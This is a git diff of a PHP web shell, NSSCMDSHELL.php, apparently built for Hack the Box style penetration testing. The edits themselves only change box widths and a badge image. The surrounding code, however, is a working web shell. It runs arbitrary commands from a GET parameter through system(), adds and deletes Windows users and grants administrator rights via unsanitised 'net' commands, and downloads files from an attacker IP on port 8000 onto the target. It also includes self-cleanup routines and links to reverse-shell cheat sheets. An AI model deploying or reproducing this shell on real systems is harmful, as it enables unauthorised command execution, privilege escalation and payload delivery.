@@ -63,7 +63,7 @@ $attackport = "8000";
                 readfile($filename);
                 die();
             } else{
-                echo '<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>';
+                echo '<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>';
             }
         }
         echo '
@@ -102,51 +102,51 @@ $attackport = "8000";
         <input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
         <br><br>
         <button type="submit" name="addUser" title="adds the specified user to the system with the password provided." class="btn btn-primary"><i class="fa fa-user-plus"></i> Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user." class="btn btn-primary"><i class="fa fa-user-secret"></i> Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user." class="btn btn-primary"><i class="fa fa-user"></i> Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user." class="btn btn-danger"><i class="fa fa-user-times"></i> DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;
-        </form><br><form><a role="button" href="?update=true" title="Check for and Download newer version of NSSCMDSHELL.php" class="btn btn-success"><i class="fa fa-retweet"></i> Update</a> <input type="hidden" name="clear" value="true" /><button onClick="window.location.reload();" class="btn btn-danger"><i class="fa fa-refresh"></i> Clear Console</button><div style="float:right;"><a href="https://app.hackthebox.com/profile/476578" target="_blank" title="KaotickJ on Hack the Box"><img src="http://www.hackthebox.eu/badge/image/476578" /></a></div></form>
+        </form><br><form><a role="button" href="?update=true" title="Check for and Download newer version of NSSCMDSHELL.php" class="btn btn-success"><i class="fa fa-retweet"></i> Update</a> <input type="hidden" name="clear" value="true" /><button onClick="window.location.reload();" class="btn btn-danger"><i class="fa fa-refresh"></i> Clear Console</button><div style="float:right;"><a href="https://app.hackthebox.com/profile/476578" target="_blank" title="KaotickJ on Hack the Box"><img src="https://img.shields.io/badge/Powered%20by-Kaos-red" /></a></div></form>
 
         </div>';
 
         if (isset($_GET['addUser'])){
-            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a username for the new user</p></div>');
-            if(empty($_GET['pass'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a password for the new user</p></div>');
+            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a username for the new user</p></div>');
+            if(empty($_GET['pass'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a password for the new user</p></div>');
             echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
             echo (system("net user ".$_GET['user']." ".$_GET['pass']." /add"));
             echo '</pre>';
         }
 
         if (isset($_GET['userAdmin'])){
-            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a user to escelate to admin</p></div>');
+            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a user to escelate to admin</p></div>');
             echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
             echo (system("net localgroup administrators ".$_GET['user']." /add"));
             echo '</pre>';
         }
 
         if (isset($_GET['userStandard'])){
-            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a user to revoke admin</p></div>');
+            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a user to revoke admin</p></div>');
             echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
             echo (system("net localgroup administrators ".$_GET['user']." /del"));
             echo '</pre>';
         }
 
         if (isset($_GET['delUser'])){
-            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>you need to enter a user to delete</p></div>');
+            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a user to delete</p></div>');
             echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
             echo (system("net user ".$_GET['user']." /del"));
             echo '</pre>';
         }
 
         if (isset($_GET['upload'])) {
-            if($_GET['upload'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
-            if($_GET['upload'] == "Choose") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:50%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
+            if($_GET['upload'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:55%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
+            if($_GET['upload'] == "Choose") die('<div style="background:red;color:#fff;margin:10px 40px;padding:30px;width:55%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
             $action = $_GET['upload'];
                 if(!in_array($action, $_SESSION['actions'])) {
                 $_SESSION['actions'][] = $action;
 //				var_dump($_SESSION['actions']);
                 }
             if(!file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']))) {
-                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>Upload Failed!</p>');
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>Upload Failed!</p>');
             } else {
-                echo '<div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;">
+                echo '<div style="width:55%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;">
                           <p>File uploaded successfully.</p>
                 </div>';
             }
@@ -157,7 +157,7 @@ $attackport = "8000";
 
 
         if (isset($_GET['cmd'])) {
-            if($_GET['cmd'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>no command specified. you must enter a command to be executed</p></div>');
+            if($_GET['cmd'] == "") die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>no command specified. you must enter a command to be executed</p></div>');
             echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
             echo (system($_GET['cmd']));
             echo '</pre>';
@@ -168,7 +168,7 @@ $attackport = "8000";
 		}
 
         if (isset($_GET['links'])) {
-           echo '<div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">
+           echo '<div style="width:55%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">
             <p>Quick Links:</p>
             <a href="https://github.com/frizb/MSF-Venom-Cheatsheet" target="_blank">Msfvenom Cheat Sheet</a><br>
             <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse Shell Cheat Sheet</a><br>
@@ -186,7 +186,7 @@ if (is_get_request()){
     }
     if (isset($_GET['kill_me'])) {
             if (!unlink ('nsscmdshell.php')){
-                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>File can\'t be deleted.</p>');
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>File can\'t be deleted.</p>');
             }
             else {
 				echo 'Success!<br>';
@@ -199,7 +199,7 @@ if (is_get_request()){
         $alerts = "";
         foreach($cleans as $clean) {
             if (!unlink ($clean)){
-                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>'. $clean .' can\'t be deleted.</p>');
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>'. $clean .' can\'t be deleted.</p>');
             }
             else {
             $alerts .= $clean .'<br>';
@@ -228,11 +228,11 @@ if (is_get_request()){
             });
         });
     </script>
-                   <div style="width:50%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;"><p>Deleted: </p><?php echo $alerts; ?><p>Cleanup completed successfully.</p><p>Do you also want to delete nsscmdshell.php?</p> <form action="" method="get"><br><button class="btn btn-danger" id="btnSubmit" name="kill_me">Delete nsccmdshell.php </button> <a role="button" href="?clear=true" class="btn"><button class="btn btn-warning">Keep nsscmdshell.php</button></a></form></div>
+                   <div style="width:55%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;"><p>Deleted: </p><?php echo $alerts; ?><p>Cleanup completed successfully.</p><p>Do you also want to delete nsscmdshell.php?</p> <form action="" method="get"><br><button class="btn btn-danger" id="btnSubmit" name="kill_me">Delete nsccmdshell.php </button> <a role="button" href="?clear=true" class="btn"><button class="btn btn-warning">Keep nsscmdshell.php</button></a></form></div>
 <?php
                 }
             } else {
-                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:50%;"><h4>Error!</h4><p>Nothing to do!</p></div>');
+                die('<div style="background:red;color:#fff;margin:10px 40px;padding:20px;width:55%;"><h4>Error!</h4><p>Nothing to do!</p></div>');
             }
     }
     if (isset($_GET['check'])) {
